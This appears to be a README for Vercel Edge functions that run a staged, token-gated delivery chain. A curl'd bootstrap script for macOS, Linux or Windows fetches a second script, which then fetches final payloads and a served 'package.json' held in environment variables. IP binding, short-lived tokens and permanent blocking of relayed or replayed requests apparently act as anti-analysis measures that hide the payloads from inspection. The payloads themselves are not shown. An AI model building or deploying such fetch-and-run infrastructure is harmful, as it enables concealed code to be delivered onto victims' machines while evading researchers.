# api/task — Vercel Edge Functions

Tokenized multi-step access-provisioning flow, rewritten from Express to Vercel Edge Runtime.  
All files use the **Web Crypto API** — no Node.js built-ins, no `jsonwebtoken` dependency.

---

## Endpoints

| Endpoint | Step | Description |
|---|---|---|
| `GET /api/task/mac` | 1 | Issues step-1 JWT; returns macOS/Linux bootstrap script |
| `GET /api/task/linux` | 1 | Issues step-1 JWT; returns Linux bootstrap script |
| `GET /api/task/windows` | 1 | Issues step-1 JWT; returns Windows CMD bootstrap script |
| `GET /api/task/tokenlinux` | 2 | Verifies step-1 JWT; injects step-2 JWT into shell payload |
| `GET /api/task/token` | 2 | Verifies step-1 JWT; injects step-2 JWT into CMD payload |
| `GET /api/task/tokenParser` | 3 | Verifies step-2 JWT; serves keyed payload from env vars |
| `GET /api/task/package.json` | — | Public endpoint; serves `PACKAGE_JSON_PAYLOAD` env var |
| `GET /api/task/events` | — | SSE endpoint (heartbeat); emits `connected` event |
| `GET /api/task/_debug-decode` | — | **Dev only** — decodes a step token (403 in production) |

---

## Environment Variables

Set these in your Vercel project dashboard under **Settings → Environment Variables**.

| Variable | Required | Description |
|---|---|---|
| `SECRET_KEY` | ✅ | HMAC-SHA256 signing key for JWTs. Use a long random string. |
| `WINDOWS_PAYLOAD` | ✅ | Content of `token.npl` (base64 or plain). Supports `{{DOMAIN}}`, `{{token}}`, `{{STEP_TOKEN}}`. |
| `LINUX_PAYLOAD` | ✅ | Content of `tokenlinux.npl` (base64 or plain). Same placeholders. |
| `PAYLOAD_<TOKEN>` | ✅ | Final payload for `tokenParser`. Key is `PAYLOAD_` + token uppercased. E.g. token=812 → `PAYLOAD_812`. |
| `PACKAGE_JSON_PAYLOAD` | ✅ | Content served at `/api/task/package.json` (base64 or plain). |
| `FIREBASE_SERVICE_ACCOUNT` | ⚪ | Full Firebase service account JSON (stringified). Enables persistent IP blocklist. |
| `SECURITY_ENABLED` | ⚪ | Set to `false` to disable blocklist checks entirely. Defaults to `true`. |
| `STEP_MIN_DELAY_MS` | ⚪ | Minimum ms between step-1 and step-2. Default: `4000`. |
| `JWT_TTL_SECONDS` | ⚪ | JWT lifetime in seconds. Default: `180` (3 min). |

### Encoding payloads as base64

```bash
# macOS / Linux
cat tokenlinux.npl | base64 | tr -d '\n'

# Then paste the result into LINUX_PAYLOAD in Vercel dashboard
```

---

## JWT Flow

```
Client terminal                    Vercel Edge
─────────────────────────────────────────────────
curl /mac?token=812
                    ──────────────────────────►
                    ◄─────────────────────────
                    script { curl /tokenlinux?token=812&st=<st1> }

curl /tokenlinux?token=812&st=<st1>
                    ──────────────────────────►
                      verify st1: step==1, ip match, delay check
                      inject st2 into LINUX_PAYLOAD template
                    ◄─────────────────────────
                    shell script with st2 embedded

script calls /tokenParser?token=812&st=<st2>
                    ──────────────────────────►
                      verify st2: step==2, ip match
                      load PAYLOAD_812 from env
                    ◄─────────────────────────
                    final payload content
```

---

## Security Notes

- **No `jsonwebtoken`** — signing/verification uses `crypto.subtle` (Web Crypto) only.
- **IP binding** — each token is cryptographically bound to the IP that requested step 1. Relaying tokens to a different IP triggers a permanent block.
- **Short-lived tokens** — default 3-minute TTL; configurable via `JWT_TTL_SECONDS`.
- **Delay window** — step 2 must be called within `STEP_MIN_DELAY_MS` of step 1 (default 4 s). Calls outside this window are treated as replay attacks and trigger a block.
- **Firebase blocklist** — blocked IPs are persisted to Firestore `blocked_ips` collection and checked on every request. Optional; gracefully degrades if credentials are absent.
